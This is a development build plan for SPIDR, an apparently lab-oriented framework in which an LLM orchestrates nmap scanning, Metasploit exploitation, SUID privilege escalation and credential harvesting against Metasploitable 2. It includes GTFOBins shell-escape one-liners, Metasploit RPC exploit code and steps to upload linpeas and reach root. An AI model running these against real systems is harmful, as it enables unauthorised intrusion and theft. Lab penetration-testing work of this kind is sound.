# Implementation Plan & Build Sequence
# SPIDR — System for Penetration Testing, Intelligence, Discovery & Reconnaissance

**Version**: 1.0  
**Last Updated**: 2026-04-17  
**MVP Target**: 4 weeks from start  
**Approach**: Phase-by-phase, test-after-every-step, document-first

---

## Overview

Build Philosophy:
1. Documentation is written before code — no guessing
2. Each step produces something runnable and testable
3. Test on Metasploitable 2 after each phase
4. Commit after every working step — never lose progress
5. Never move to Phase N+1 until Phase N fully passes its success criteria

---

## Phase 1: Foundation (Days 1–3)

---

### Step 1.1: Environment Setup

**Duration**: 1–2 hours  
**Goal**: Python environment and all system tools verified

**Tasks**:

1. Install Python 3.11 (if not present)
   ```bash
   python3 --version  # must show 3.11.x
   ```

2. Create project and virtualenv
   ```bash
   mkdir spidr && cd spidr
   python3 -m venv .venv
   source .venv/bin/activate
   ```

3. Create directory structure from TECH_STACK.md section 4
   ```bash
   mkdir -p spidr/{agents,state,tools,llm,templates}
   mkdir -p tests reports logs
   touch spidr/__init__.py spidr/agents/__init__.py spidr/state/__init__.py
   touch spidr/tools/__init__.py spidr/llm/__init__.py
   ```

4. Create `requirements.txt` with exact versions from TECH_STACK.md section 6
   ```bash
   pip install -r requirements.txt
   ```

5. Verify all system tools are in PATH
   ```bash
   which nmap gobuster nikto enum4linux msfconsole
   # All must return paths
   ```

6. Create `.env.example` from TECH_STACK.md section 5 and copy to `.env`
   ```bash
   cp .env.example .env
   # Fill in TOGETHER_API_KEY and MSF_RPC_PASSWORD
   ```

7. Initialize git
   ```bash
   git init
   echo ".env" >> .gitignore
   echo ".venv/" >> .gitignore
   echo "spidr_state.db" >> .gitignore
   echo "reports/" >> .gitignore
   echo "logs/" >> .gitignore
   git add .
   git commit -m "chore: initial project scaffold"
   ```

**Success Criteria**:
- [ ] `python3 -m spidr` runs without import error
- [ ] `which nmap` returns a path
- [ ] `pip list` shows all required packages at correct versions
- [ ] `.env` exists with Together AI key and MSF password filled in
- [ ] Git repo initialized

**Reference Docs**: TECH_STACK.md sections 2, 4, 5, 6

---

### Step 1.2: Database Foundation

**Duration**: 2–3 hours  
**Goal**: SQLite DB with all tables created, StateStore class working

**Tasks**:

1. Create `spidr/state/models.py` with all SQLAlchemy models from BACKEND_STRUCTURE.md section 3
   - Run, OpenPort, Finding, Session, PrivescVector, Credential

2. Create `spidr/state/store.py` with StateStore class from BACKEND_STRUCTURE.md section 4
   - All CRUD methods: `create_run`, `add_open_ports`, `add_finding`, etc.

3. Create `spidr/config.py` to load all env vars from `.env`
   ```python
   from dotenv import load_dotenv
   import os
   load_dotenv()
   
   TOGETHER_API_KEY = os.getenv("TOGETHER_API_KEY")
   TOGETHER_BASE_URL = os.getenv("TOGETHER_BASE_URL", "https://api.together.xyz/v1")
   TOGETHER_MODEL = os.getenv("TOGETHER_MODEL", "Qwen/Qwen2.5-72B-Instruct-Turbo")
   MSF_RPC_HOST = os.getenv("MSF_RPC_HOST", "127.0.0.1")
   MSF_RPC_PORT = int(os.getenv("MSF_RPC_PORT", 55553))
   MSF_RPC_PASSWORD = os.getenv("MSF_RPC_PASSWORD")
   SPIDR_DB_PATH = os.getenv("SPIDR_DB_PATH", "./spidr_state.db")
   REPORT_DIR = os.getenv("REPORT_DIR", "./reports")
   LOG_DIR = os.getenv("LOG_DIR", "./logs")
   ```

4. Write unit tests in `tests/test_state_store.py`
   ```bash
   pytest tests/test_state_store.py -v
   ```

**Success Criteria**:
- [ ] `python3 -c "from spidr.state.store import StateStore; s = StateStore(); print('OK')"` prints OK
- [ ] All 6 tables created in `spidr_state.db` (verify with `sqlite3 spidr_state.db .tables`)
- [ ] `create_run`, `add_open_ports`, `add_finding` CRUD methods work
- [ ] Unit tests pass: `pytest tests/test_state_store.py -v`

**Reference Docs**: BACKEND_STRUCTURE.md sections 2, 3, 4

---

### Step 1.3: LLM Client Setup

**Duration**: 1–2 hours  
**Goal**: Qwen LLM callable, orchestrator prompt works end-to-end

**Tasks**:

1. Create `spidr/llm/client.py`
   ```python
   from openai import OpenAI
   import time, json
   from spidr.config import TOGETHER_API_KEY, TOGETHER_BASE_URL, TOGETHER_MODEL
   
   client = OpenAI(api_key=TOGETHER_API_KEY, base_url=TOGETHER_BASE_URL)
   
   def call_qwen(system_prompt: str, user_prompt: str, max_tokens: int = 512) -> str:
       """Call Qwen with exponential backoff on rate limit."""
       for attempt in range(3):
           try:
               response = client.chat.completions.create(
                   model=TOGETHER_MODEL,
                   messages=[
                       {"role": "system", "content": system_prompt},
                       {"role": "user", "content": user_prompt}
                   ],
                   max_tokens=max_tokens,
                   temperature=0.1
               )
               return response.choices[0].message.content
           except Exception as e:
               if "429" in str(e) and attempt < 2:
                   time.sleep(2 ** attempt)
                   continue
               raise
       raise Exception("LLM rate limit exceeded after 3 retries")
   
   def call_qwen_json(system_prompt: str, user_prompt: str) -> dict:
       """Call Qwen and parse JSON response. Falls back to rule-based on parse failure."""
       raw = call_qwen(system_prompt, user_prompt)
       try:
           return json.loads(raw)
       except json.JSONDecodeError:
           # Extract JSON from markdown code blocks if present
           import re
           match = re.search(r'\{.*\}', raw, re.DOTALL)
           if match:
               return json.loads(match.group())
           raise ValueError(f"LLM returned non-JSON: {raw}")
   ```

2. Create `spidr/llm/prompts.py` with all prompt templates from BACKEND_STRUCTURE.md section 6

3. Test LLM connection manually:
   ```bash
   python3 -c "
   from spidr.llm.client import call_qwen_json
   from spidr.llm.prompts import ORCHESTRATOR_SYSTEM_PROMPT
   result = call_qwen_json(ORCHESTRATOR_SYSTEM_PROMPT, 'State: no ports found. What next?')
   print(result)
   "
   ```

**Success Criteria**:
- [ ] LLM call returns valid JSON with `next` and `reason` keys
- [ ] Rate limit retry logic works (test by hammering 5 calls in a row)
- [ ] Invalid JSON fallback handled without crashing

**Reference Docs**: BACKEND_STRUCTURE.md sections 6; TECH_STACK.md section 10

---

## Phase 2: Core Agents (Days 4–10)

---

### Step 2.1: Recon Agent (nmap wrapper)

**Duration**: 3–4 hours  
**Goal**: nmap runs, XML parsed, results stored in SQLite

**Tasks**:

1. Create `spidr/tools/nmap_tool.py`
   ```python
   import subprocess, tempfile
   from libnmap.parser import NmapParser
   
   def run_nmap(target_ip: str, ports: str = None) -> list[dict]:
       with tempfile.NamedTemporaryFile(suffix=".xml", delete=False) as f:
           out_file = f.name
       
       cmd = ["nmap", "-sV", "-sC", "-oX", out_file, "--open"]
       if ports:
           cmd += ["-p", ports]
       else:
           cmd += ["-p-", "--min-rate", "1000"]
       cmd.append(target_ip)
       
       result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
       
       report = NmapParser.parse_fromfile(out_file)
       ports_found = []
       for host in report.hosts:
           for svc in host.services:
               ports_found.append({
                   "port": svc.port,
                   "protocol": svc.protocol,
                   "state": svc.state,
                   "service": svc.service,
                   "version": svc.banner or "",
                   "product": svc.product or "",
                   "extra_info": svc.extrainfo or "",
               })
       return ports_found
   ```

2. Create `spidr/agents/recon.py`
   ```python
   from spidr.state.store import StateStore
   from spidr.tools.nmap_tool import run_nmap
   from spidr.agents.orchestrator import SpidrState
   
   def recon_agent(state: SpidrState) -> SpidrState:
       store = StateStore()
       store.update_phase(state["run_id"], "recon")
       
       ports = run_nmap(state["target_ip"])
       store.add_open_ports(state["run_id"], ports)
       
       return {**state, "open_ports": ports}
   ```

3. Test against Metasploitable 2:
   ```python
   ports = run_nmap("192.168.56.101")
   assert any(p["port"] == 21 for p in ports), "FTP port 21 not found"
   assert any(p["port"] == 80 for p in ports), "HTTP port 80 not found"
   ```

**Success Criteria**:
- [ ] `run_nmap("192.168.56.101")` returns list with port 21, 80, 139, 445
- [ ] Results stored in `open_ports` table in SQLite
- [ ] VSFTPD 2.3.4 version string present in results
- [ ] Handles unreachable target without crashing (raises `TargetUnreachableError`)

**Reference Docs**: APP_FLOW.md Step 4; BACKEND_STRUCTURE.md Table: open_ports

---

### Step 2.2: Enumeration Agent

**Duration**: 4–5 hours  
**Goal**: gobuster, nikto, enum4linux run selectively, LLM interprets findings

**Tasks**:

1. Create `spidr/tools/gobuster_tool.py` — subprocess wrapper, returns list of discovered paths
2. Create `spidr/tools/nikto_tool.py` — subprocess wrapper, parses nikto text output
3. Create `spidr/tools/enum4linux_tool.py` — subprocess wrapper, parses SMB shares and user list

4. Create `spidr/agents/enumeration.py`
   - Reads `open_ports` from state
   - Runs nikto if HTTP/HTTPS port found
   - Runs enum4linux if port 139 or 445 found
   - Runs FTP banner grab if port 21 found
   - Calls Qwen to interpret raw output and generate `Finding` objects with CVE candidates

5. Create LLM prompt for finding interpretation in `spidr/llm/prompts.py`:
   ```python
   ENUM_INTERPRETATION_PROMPT = """
   You are a penetration tester analyzing enumeration output.
   Given the following tool output, identify security findings.
   For each finding output ONLY valid JSON array.
   Format each finding as:
   {"title": "...", "service": "...", "port": N, "severity": "critical|high|medium|low|info",
    "cvss_score": N.N, "cve_id": "CVE-XXXX-XXXX or null", "attack_technique": "TXXXX or null",
    "description": "...", "recommendation": "..."}
   """
   ```

**Success Criteria**:
- [ ] nikto finds Apache version and DVWA on port 80
- [ ] enum4linux returns user list from Metasploitable 2 SMB
- [ ] FTP banner grab identifies vsftpd 2.3.4
- [ ] LLM correctly tags CVE-2011-2523 from vsftpd banner
- [ ] All findings stored in `findings` table with correct severity
- [ ] `findings` table contains at least 1 critical finding

**Reference Docs**: APP_FLOW.md Step 6; BACKEND_STRUCTURE.md Table: findings

---

### Step 2.3: Orchestrator Agent (LangGraph StateGraph)

**Duration**: 3–4 hours  
**Goal**: LangGraph graph wires all agents together, orchestrator makes correct decisions

**Tasks**:

1. Create `spidr/agents/orchestrator.py` with `SpidrState` TypedDict and `orchestrator_node` function from BACKEND_STRUCTURE.md section 5

2. Build LangGraph StateGraph:
   ```python
   from langgraph.graph import StateGraph, END
   
   def build_graph() -> StateGraph:
       graph = StateGraph(SpidrState)
       graph.add_node("orchestrator", orchestrator_node)
       graph.add_node("recon", recon_agent)
       graph.add_node("enumerate", enumeration_agent)
       graph.add_node("exploit", exploitation_agent)
       graph.add_node("post_exploit", post_exploit_agent)
       graph.add_node("report", reporting_agent)
   
       graph.set_entry_point("orchestrator")
   
       graph.add_conditional_edges(
           "orchestrator",
           lambda s: s["next_agent"],
           {
               "recon": "recon",
               "enumerate": "enumerate",
               "exploit": "exploit",
               "post_exploit": "post_exploit",
               "report": "report",
           }
       )
       for node in ["recon", "enumerate", "exploit", "post_exploit"]:
           graph.add_edge(node, "orchestrator")
       graph.add_edge("report", END)
   
       return graph.compile()
   ```

3. Test orchestrator decisions by mocking state:
   ```python
   # Empty state → should decide "recon"
   # State with ports but no findings → should decide "enumerate"
   # State with critical finding → should decide "exploit"
   ```

**Success Criteria**:
- [ ] Orchestrator correctly decides "recon" when `open_ports` is empty
- [ ] Orchestrator correctly decides "enumerate" when `open_ports` has data but `findings` is empty
- [ ] Orchestrator correctly decides "exploit" when `findings` has critical CVE
- [ ] Orchestrator correctly decides "report" when no msfrpcd available
- [ ] Graph compiles without errors
- [ ] Mock run through recon → enumerate → report without real tools works

**Reference Docs**: APP_FLOW.md Decision Points; BACKEND_STRUCTURE.md sections 5, 6

---

### Step 2.4: Exploitation Agent

**Duration**: 4–5 hours  
**Goal**: pymetasploit3 connects to msfrpcd, fires exploit, returns session ID

**Pre-requisite**: Start msfrpcd:
```bash
msfrpcd -P yourpassword -S -a 127.0.0.1
```

**Tasks**:

1. Create `spidr/tools/msf_tool.py`
   ```python
   from pymetasploit3.msfrpc import MsfRpcClient
   from spidr.config import MSF_RPC_HOST, MSF_RPC_PORT, MSF_RPC_PASSWORD
   
   def get_msf_client() -> MsfRpcClient:
       return MsfRpcClient(MSF_RPC_PASSWORD, server=MSF_RPC_HOST, port=MSF_RPC_PORT, ssl=True)
   
   def run_exploit(module_path: str, options: dict, payload: str, lhost: str) -> dict:
       client = get_msf_client()
       exploit = client.modules.use("exploit", module_path)
       for key, val in options.items():
           exploit[key] = val
       
       payload_obj = client.modules.use("payload", payload)
       payload_obj["LHOST"] = lhost
       
       result = exploit.execute(payload=payload_obj)
       return result  # Contains session ID if successful
   ```

2. Create `spidr/tools/cve_module_map.py` with full lookup table from BACKEND_STRUCTURE.md section 7

3. Create `spidr/agents/exploitation.py`
   - Reads critical findings from state
   - Ranks by CVSS score
   - Tries each CVE in order (highest CVSS first)
   - On success: stores session in `sessions` table, returns session ID
   - On failure: logs and tries next

**Success Criteria**:
- [ ] `get_msf_client()` connects without error (msfrpcd must be running)
- [ ] VSFTPD exploit fires against Metasploitable 2 and returns session
- [ ] Session ID stored in `sessions` table
- [ ] Exploit failure (wrong target) handled gracefully — logs and continues

**Reference Docs**: APP_FLOW.md Step 8; BACKEND_STRUCTURE.md Table: sessions

---

### Step 2.5: Post-Exploitation Agent

**Duration**: 4–5 hours  
**Goal**: linpeas runs via Meterpreter, privesc vector found, root obtained

**Tasks**:

1. Create `spidr/tools/gtfobins.py` with SUID binary lookup dict:
   ```python
   SUID_PRIVESC = {
       "/bin/bash":    "bash -p",
       "/usr/bin/find": "find . -exec /bin/sh \\;",
       "/usr/bin/vim":  "vim -c ':!/bin/sh'",
       "/usr/bin/nmap": "nmap --interactive → !sh",
       "/usr/bin/python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
   }
   ```

2. Create `spidr/agents/post_exploit.py`
   - Upload `linpeas.sh` to target via Meterpreter file upload
   - Execute linpeas and capture output
   - Parse output for SUID binaries (regex: `/usr/bin/\S+ -rwsr`)
   - Cross-reference with GTFOBins lookup
   - Attempt privesc via best candidate
   - Check if root (run `id`, parse uid=0)
   - Store privesc vectors and credentials in SQLite

**Success Criteria**:
- [ ] linpeas.sh uploads and executes via Meterpreter session
- [ ] SUID binary parsing finds at least 1 candidate on Metasploitable 2
- [ ] Root shell obtained (uid=0 confirmed)
- [ ] Privesc vector stored in `privesc_vectors` table with `root_achieved=True`
- [ ] Credentials harvested from `.bash_history` stored in `credentials` table

**Reference Docs**: APP_FLOW.md Step 10; BACKEND_STRUCTURE.md Tables: privesc_vectors, credentials

---

## Phase 3: CLI & Terminal UI (Days 11–14)

---

### Step 3.1: CLI Entry Point

**Duration**: 2–3 hours  
**Goal**: `spidr run --target <IP>` invokes the full pipeline

**Tasks**:

1. Create `spidr/cli.py` with Click commands:
   ```python
   import click
   from spidr.agents.orchestrator import build_graph
   from spidr.state.store import StateStore
   
   @click.group()
   def main():
       pass
   
   @main.command()
   @click.option("--target", required=True, help="Target IP address")
   @click.option("--start-from", default="recon", 
                 type=click.Choice(["recon","enumerate","exploit","post_exploit","report"]))
   def run(target, start_from):
       """Run full SPIDR pipeline against target."""
       store = StateStore()
       run_id = store.create_run(target)
       graph = build_graph()
       # Initialize state and run graph
       initial_state = { "run_id": run_id, "target_ip": target, ... }
       graph.invoke(initial_state)
   
   @main.command()
   def status():
       """Show current pipeline status."""
       ...
   
   @main.command()
   @click.option("--target", required=True)
   def report(target):
       """Regenerate report for target."""
       ...
   
   @main.command()
   def preflight():
       """Run pre-flight tool checks only."""
       ...
   ```

2. Install as CLI tool:
   ```bash
   pip install -e .
   spidr --help
   ```

**Success Criteria**:
- [ ] `spidr --help` shows all commands
- [ ] `spidr preflight` runs all tool checks and prints results
- [ ] `spidr run --target 192.168.56.101` starts the pipeline
- [ ] `spidr status` shows runs table

**Reference Docs**: APP_FLOW.md sections 1–2; TECH_STACK.md section 9

---

### Step 3.2: Terminal UI (Rich Components)

**Duration**: 3–4 hours  
**Goal**: All Rich components from FRONTEND_GUIDELINES.md implemented and displaying

**Tasks**:

1. Create `spidr/ui/display.py` with all components from FRONTEND_GUIDELINES.md sections 4–8:
   - `render_banner()`
   - `render_preflight()`
   - `render_orchestrator_decision()`
   - `render_ports_table()`
   - `render_findings_table()`
   - `render_exploit_status()`
   - `render_error()`
   - `render_success_banner()`
   - `render_status_table()`
   - `log_action()`

2. Integrate Rich components into each agent's output (call after each major action)

3. Add progress spinner for long-running tasks (nmap, linpeas)

**Success Criteria**:
- [ ] Banner displays on startup with ASCII art and target IP
- [ ] Pre-flight table shows pass/fail per check
- [ ] Ports table renders correctly after recon
- [ ] Findings table color-codes severity correctly
- [ ] `SPIDR_NO_RICH=true` switches to plain text output

**Reference Docs**: FRONTEND_GUIDELINES.md sections 4–8

---

## Phase 4: Reporting (Days 15–17)

---

### Step 4.1: Jinja2 HTML Report

**Duration**: 3–4 hours  
**Goal**: Full HTML pentest report rendered from SQLite data

**Tasks**:

1. Create `spidr/templates/report.html` — Jinja2 template with:
   - Cover page: Target IP, date, severity summary
   - Executive summary section (LLM-generated)
   - Attack chain timeline
   - Open ports table
   - Findings section (one card per finding)
   - Credentials section
   - Privesc section
   - MITRE ATT&CK mapping table

2. Create `spidr/templates/report.css` with dark theme from FRONTEND_GUIDELINES.md section 6

3. Create `spidr/agents/reporting.py`
   - Build `report_context` dict from BACKEND_STRUCTURE.md section 8
   - Call Qwen to generate executive summary
   - Render Jinja2 template
   - Save `.html` to `./reports/`

**Success Criteria**:
- [ ] HTML report renders in browser without layout issues
- [ ] All findings present with severity badges
- [ ] CVSS scores and ATT&CK TTP IDs present
- [ ] Executive summary is coherent and accurate

**Reference Docs**: BACKEND_STRUCTURE.md section 8; FRONTEND_GUIDELINES.md section 6

---

### Step 4.2: PDF Generation

**Duration**: 1–2 hours  
**Goal**: weasyprint converts HTML to professional PDF

**Tasks**:

1. Add to `reporting.py`:
   ```python
   from weasyprint import HTML as WPHtml
   
   def html_to_pdf(html_path: str, pdf_path: str) -> None:
       WPHtml(filename=html_path).write_pdf(pdf_path)
   ```

2. Install weasyprint system dependency:
   ```bash
   sudo apt install libpango-1.0-0 libpangoft2-1.0-0
   ```

3. Verify PDF output at correct path

**Success Criteria**:
- [ ] PDF generated at `./reports/<date>_<IP>.pdf`
- [ ] PDF matches HTML layout
- [ ] PDF file size < 2MB for a standard Metasploitable 2 run
- [ ] No weasyprint warnings about missing fonts

**Reference Docs**: TECH_STACK.md section 2 (weasyprint entry)

---

## Phase 5: Testing (Days 18–21)

---

### Step 5.1: Unit Tests

**Duration**: 4 hours  
**Goal**: Core logic covered with unit tests

**Files to create**:

- `tests/test_state_store.py` — CRUD operations for all 6 tables
- `tests/test_nmap_tool.py` — mock subprocess, test XML parsing
- `tests/test_llm_client.py` — mock Together AI response, test JSON parsing
- `tests/test_cve_module_map.py` — verify all CVE entries have required fields
- `tests/test_gtfobins.py` — verify SUID lookup returns correct commands

```bash
pytest tests/ -v --cov=spidr --cov-report=term-missing
```

**Success Criteria**:
- [ ] All unit tests pass
- [ ] Coverage >= 70% for `spidr/state/`, `spidr/tools/`, `spidr/llm/`
- [ ] No test relies on external network calls (all mocked)

---

### Step 5.2: Integration Test on Metasploitable 2

**Duration**: 4 hours  
**Goal**: Full end-to-end run completes successfully on Metasploitable 2

**Pre-requisites**:
- Metasploitable 2 running at 192.168.56.101 (or configured IP)
- msfrpcd running on attacker

**Test Script** (`tests/integration_test_ms2.sh`):
```bash
#!/bin/bash
set -e
TARGET="192.168.56.101"

echo "=== SPIDR Integration Test on Metasploitable 2 ==="

# Full run
spidr run --target $TARGET

# Verify SQLite has results
python3 -c "
from spidr.state.store import StateStore
s = StateStore()
# Get last run
# Assert at least 20 ports
# Assert at least 1 critical finding  
# Assert at least 1 session
# Assert at least 1 privesc vector
print('INTEGRATION TEST PASSED')
"

# Verify report generated
ls reports/*.pdf && echo "PDF report found"
```

**Success Criteria**:
- [ ] Full pipeline completes without crashing
- [ ] >= 20 open ports found on Metasploitable 2
- [ ] CVE-2011-2523 finding present in `findings` table
- [ ] Session opened and recorded in `sessions` table
- [ ] At least one privesc vector found
- [ ] PDF report generated
- [ ] Full run < 15 minutes

---

## Phase 6: Polish & Documentation (Days 22–25)

---

### Step 6.1: README.md

**Duration**: 2–3 hours  
**Goal**: Professional README for GitHub

**Sections**:
1. Banner with ASCII art
2. What SPIDR is (2 sentences)
3. Demo GIF or screenshot of terminal output
4. Prerequisites (OS, tools, accounts)
5. Installation (step-by-step)
6. Setup (msfrpcd, .env, Metasploitable 2)
7. Usage (`spidr run`, `spidr status`, `spidr report`)
8. Example output (sample report screenshot)
9. Architecture diagram (SPIDR agent flow)
10. Ethical use disclaimer (bold, prominent)
11. Tech stack badges
12. License (MIT)

**Success Criteria**:
- [ ] Someone unfamiliar with the project can set it up in < 30 minutes following the README
- [ ] Ethical disclaimer is prominent and clear
- [ ] All commands in README are tested and work

---

### Step 6.2: GitHub Repository Setup

**Duration**: 1 hour  
**Goal**: Professional GitHub repo

**Tasks**:
1. Create `.gitignore` with `.env`, `spidr_state.db`, `reports/`, `logs/`, `.venv/`
2. Add `LICENSE` (MIT)
3. Create `CONTRIBUTING.md`
4. Create `DISCLAIMER.md` — ethical use only, lab environments only
5. Add GitHub repo description: "AI-powered multi-agent penetration testing framework for controlled lab environments"
6. Add topics: `cybersecurity`, `penetration-testing`, `llm`, `langgraph`, `metasploit`, `python`, `offensive-security`

---

## Milestones & Timeline

### Milestone 1: Foundation Complete
**Target**: End of Day 3  
- [ ] Project scaffolded and installable
- [ ] SQLite DB with all tables working
- [ ] Qwen LLM callable and returning correct decisions

### Milestone 2: Core Agents Working
**Target**: End of Day 10  
- [ ] Recon agent finds ports on Metasploitable 2
- [ ] Enumeration agent identifies VSFTPD CVE
- [ ] Orchestrator makes correct decisions
- [ ] Exploitation agent opens Meterpreter session
- [ ] Post-exploitation agent achieves root

### Milestone 3: Full Pipeline End-to-End
**Target**: End of Day 17  
- [ ] Full `spidr run` completes without manual intervention
- [ ] HTML + PDF report generated
- [ ] Rich terminal UI displays all panels

### Milestone 4: MVP Launch (GitHub)
**Target**: End of Day 25  
- [ ] All tests passing (unit + integration)
- [ ] README complete
- [ ] Repo public on GitHub

---

## Risk Mitigation

| Risk | Impact | Mitigation |
|------|--------|------------|
| Metasploit RPC API changes | High | Pin pymetasploit3==1.0.3, test on install |
| Qwen model behavior change | Medium | Pin model string, test prompt → JSON contract |
| weasyprint install fails on Kali | Medium | Document apt dependencies explicitly in README |
| LangGraph version break | Medium | Pin langgraph==0.2.28, test graph.compile() |
| Metasploitable 2 network unreachable | High | Include VirtualBox host-only adapter setup in README |
| Together AI free tier deprecated | Medium | Add fallback to local Ollama (qwen2.5:7b) — document as alt |

---

## Post-MVP Roadmap

After GitHub launch:
1. Add Shodan integration to Recon Agent (P1 from PRD)
2. Build Flask web dashboard (live agent activity feed)
3. Add support for CIDR ranges (multiple targets)
4. Docker container for clean deployment (`docker run spidr --target ...`)
5. BloodHound integration for AD environments (P2)
